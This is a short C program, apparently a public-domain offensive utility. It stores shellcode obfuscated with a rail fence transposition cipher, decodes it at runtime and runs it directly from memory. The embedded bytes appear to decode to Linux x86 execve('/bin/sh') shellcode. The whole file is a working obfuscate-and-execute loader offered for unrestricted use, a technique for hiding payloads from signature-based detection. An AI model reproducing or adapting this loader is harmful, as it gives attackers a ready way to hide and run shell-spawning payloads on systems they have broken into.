/* rf-shellcode.c

Decodes characters using the rail fence method, a transposition cipher
then executes the code.

This program was written by John W. Pierce, CISSP.  I enter it into
the public domain.  You are free to use and/or redistribute it without 
restriction, though attribution would be the right thing to do.  I hope
it is of some value, but I make ABSOLUTELY NO WARRANTY OF ANY KIND.

*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>



int	main() {

	int	l,j,k,p,t;	// length of string, counters and a toggle
	int	i[2];		// need two incrementers for algorithm
	unsigned char inp[] = "\x31\x68\x89\x80\xc0\x68\x2f\x50\xe2\xcd\x50\x73\x62\xe3\x53\x0b\x68\x2f\x69\x89\x89\xb0\x2f\x6e\xe1";

	int	key = 5;
	unsigned char *buf;

	l = strlen(inp);

	printf("\n\nShellcode length: %d", l);
	printf("\n Key:	%d", key);
	if (key > l)	{
		printf("Key needs to be shorter than length of shellcode\n");
		exit(0);
	}
	// make a buffer to store cipher
	buf =  malloc(l);
	if (buf==0) {
		printf("\nmemory exhausted\n");
		exit(0);
	}
	p = 0;		// position in buf
	// do the transposition cipher
	for (j=0; j<key; j++) {
		i[0] = (j==key-1?j:key-j-1)*2;	
		i[1] = j==0?i[0]:j*2;		
		t = 1;
		k = j;
		buf[j] = inp[p];
		do {
			t = !t;
			k += i[t];
			p++;
			if (k<l)
				buf[k] = inp[p];
		} while (k<l);
	}
	// Need to copy the buffer over the original string
	// so we can clean up, even when no return from shellcode
	for (p=0; p<l; p++)
		inp[p] = buf[p];
	free(buf);
	// Now run the code
	int (*ret)() = (int(*))inp;
	ret();
	exit(0);
}
		
